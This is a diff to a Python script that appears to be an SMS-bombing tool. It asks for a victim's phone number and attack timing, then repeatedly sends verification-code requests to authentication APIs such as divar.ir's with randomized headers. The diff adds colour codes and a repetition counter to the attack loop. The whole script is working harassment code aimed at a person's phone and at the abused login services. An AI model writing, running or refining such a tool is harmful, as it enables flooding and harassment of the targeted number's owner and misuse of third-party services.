@@ -3,7 +3,10 @@ import random
 import time
 
 #########################
-Blue="\033[1;34m"
+black = '\033[30m'
+white = '\033[37m'
+Blue ="\033[1;34m"
+yellow = '\033[33m'
 Red="\033[1;31m"
 Green="\033[1;33m"
 pink = "\033[95m"
@@ -13,11 +16,15 @@ cyan = "\033[36m"
 purple = "\033[35m"
 #########################
 
-number = input("" + cyan + "[" + Red + "Enter" + cyan + "]─[" + Blue + "number" + cyan + "]─[" + Green + "(937.........) :" + cyan + "]" + Red + ": " + Reset)
+number = input("" + cyan + "[" + Red + "Enter" + cyan + "]─[" + Blue + "the number" + cyan + "]─[" + Green + "(937.........) :" + cyan + "]" + Red + ": " + Reset)
 
 attack_speed = float(input(("" + cyan + "[" + Red + "Enter The " + Blue + "refresh rate of attacks" + cyan + "]─[" + Red + "in seconds :" + cyan + "]" + Reset)))
 
 sleep_time = float(input(("" + cyan + "[" + Red + "Enter the " + Blue + "time between attacks" + cyan + "]─[" + Red + "seconds :" + cyan + "]" + Reset)))
+
+numbert = int(input("" + cyan + "[" + Red + "Enter" + cyan + "]─[" + Blue + "the number" + cyan + "]─[" + Green + "of repetitions :" + cyan + "]" + Red + ": " + Reset))
+
+i = 0
 
 def data(number):
     url_divar = "https://api.divar.ir/v5/auth/authenticate"
@@ -112,7 +119,8 @@ heads = [
     }
 ]
 
-while True:
+#while True:
+while i < numbert:
     random_head = random.choice(heads)
 
     req_divar = requests.post(url=url_divar,json=json_divar,headers=random_head)
@@ -191,3 +199,4 @@ while True:
 
     print(Blue + "Send all requests")
     time.sleep(attack_speed)
+    i += 1
